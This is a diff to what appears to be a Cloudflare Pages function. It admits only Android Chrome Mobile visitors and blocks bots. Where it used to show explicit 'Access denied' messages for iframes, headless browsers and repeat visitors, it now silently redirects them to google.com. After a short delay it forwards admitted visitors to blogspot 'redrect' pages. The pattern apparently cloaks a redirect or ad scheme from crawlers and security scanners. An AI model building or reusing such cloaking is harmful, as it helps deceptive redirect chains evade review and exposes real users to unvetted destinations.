@@ -8,9 +8,9 @@ export async function onRequest(context) {
   const isAndroid = /Android/i.test(ua);
   const isChromeMobile = /Chrome\/\d+\.\d+ Mobile/i.test(ua);
   
-  // if (!isAndroid || !isChromeMobile) {
-  //   return new Response("Blocked: Only Android Chrome Mobile allowed", { status: 403 });
-  // }
+  if (!isAndroid || !isChromeMobile) {
+    return new Response("Blocked: Only Android Chrome Mobile allowed", { status: 403 });
+  }
 
   // 2. Block Cloudflare-detected bots
   const isBot = request.headers.get("cf-is-bot") === "true";
@@ -36,16 +36,13 @@ export async function onRequest(context) {
       <script>
         // Block iframe
         if (window !== window.top) {
-          // window.top.location = window.location.href;
-          document.write("<h2 style='color:red;text-align:center'>Access denied. iframe detected.</h2>");
-          window.stop();
+          window.location.href = "https://google.com";
         }
 
         // Headless detection
         const isHeadless = navigator.webdriver || !navigator.plugins.length || !navigator.languages.length;
         if (isHeadless) {
-          // window.location.href = "https://google.com";
-          document.body.innerHTML = "<h2>Access denied. Headless browser not allowed.</h2>";
+          window.location.href = "https://google.com";
         }
 
         // Ad frequency control
@@ -69,13 +66,10 @@ export async function onRequest(context) {
         localStorage.setItem("accessRecord", JSON.stringify(record));
 
         if (record.count > maxViews) {
-          // window.location.href = "https://google.com/";
-          document.addEventListener('DOMContentLoaded', function () {
-            document.body.innerHTML = "<h2>Access denied. Maximum.</h2>";
-            });
+          window.location.href = "https://redrect22.blogspot.com/";
         } else {
           setTimeout(() => {
-            window.location.href = "https://abc.com";
+            window.location.href = "https://redrect11.blogspot.com/";
           }, 200); // delay untuk validasi
         }
       </script>
